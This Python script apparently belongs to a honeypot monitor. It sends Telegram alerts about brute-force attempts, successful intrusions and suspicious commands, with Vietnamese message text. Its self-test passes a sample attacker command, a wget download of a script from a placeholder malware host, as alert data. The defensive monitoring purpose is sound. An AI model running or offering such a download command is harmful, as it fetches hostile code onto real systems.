import requests
import os
from dotenv import load_dotenv

load_dotenv()

TOKEN   = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

def send_message(text: str) -> bool:
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    res = requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    })
    return res.status_code == 200

def alert_login_failed(ip: str, username: str, password: str, count: int):
    msg = (
        f"⚠️ <b>BRUTE-FORCE DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"👤 Username: <code>{username}</code>\n"
        f"🔑 Password thử: <code>{password}</code>\n"
        f"🔢 Số lần thử: <b>{count}</b>\n"
        f"⏰ Loại: Login Failed"
    )
    return send_message(msg)

def alert_login_success(ip: str, username: str, password: str):
    msg = (
        f"🚨 <b>NGUY HIỂM - ĐĂNG NHẬP THÀNH CÔNG</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"👤 Username: <code>{username}</code>\n"
        f"🔑 Password: <code>{password}</code>\n"
        f"❗ Kẻ tấn công đã vào được hệ thống!"
    )
    return send_message(msg)

def alert_command(ip: str, command: str):
    msg = (
        f"💻 <b>LỆNH NGUY HIỂM PHÁT HIỆN</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"⌨️ Lệnh: <code>{command}</code>"
    )
    return send_message(msg)

if __name__ == "__main__":
    print("Đang test gửi tin nhắn...")

    ok = send_message("✅ <b>Honeypot Monitor Bot đã khởi động!</b>\nHệ thống đang giám sát...")
    print(f"Gửi thông báo khởi động: {'OK' if ok else 'FAILED'}")

    ok = alert_login_failed("185.220.101.45", "root", "123456", 15)
    print(f"Gửi cảnh báo brute-force: {'OK' if ok else 'FAILED'}")

    ok = alert_login_success("45.33.32.156", "admin", "password123")
    print(f"Gửi cảnh báo login success: {'OK' if ok else 'FAILED'}")

    ok = alert_command("103.21.244.0", "wget http://malware.com/virus.sh")
    print(f"Gửi cảnh báo command: {'OK' if ok else 'FAILED'}")
